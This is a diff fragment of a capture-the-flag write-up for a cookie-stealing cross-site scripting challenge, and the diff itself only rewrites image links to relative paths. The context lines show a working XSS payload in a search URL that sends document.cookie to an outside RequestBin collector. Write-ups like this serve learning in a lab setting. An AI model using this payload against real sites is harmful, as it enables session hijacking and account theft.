@@ -7,7 +7,7 @@ As the previous challenge __Secret Cross-site Cookies__, we create a RequestBin 
 `xss3.ctf.tamu.edu/web/search_query.php?query=><scRiPt>document.write('<IMG SRC=\"http://requestb.in/1464vht1?cookie='%2bdocument.cookie);</sCripT>`
 
 It's working for us so it has to work for the bot:
-![URL](https://github.com/mhackgyver-squad/mhackgyver/blob/master/writeup/images/SUPER_Secret_Cross-Site_Cookies_URL_creation.png)
+![URL](images/SUPER_Secret_Cross-Site_Cookies_URL_creation.png)
 
 And effectively:
-![flag](https://github.com/mhackgyver-squad/mhackgyver/blob/master/writeup/images/SUPER_Secret_Cross-Site_Cookies_URL_flag.png)
+![flag](images/SUPER_Secret_Cross-Site_Cookies_URL_flag.png)
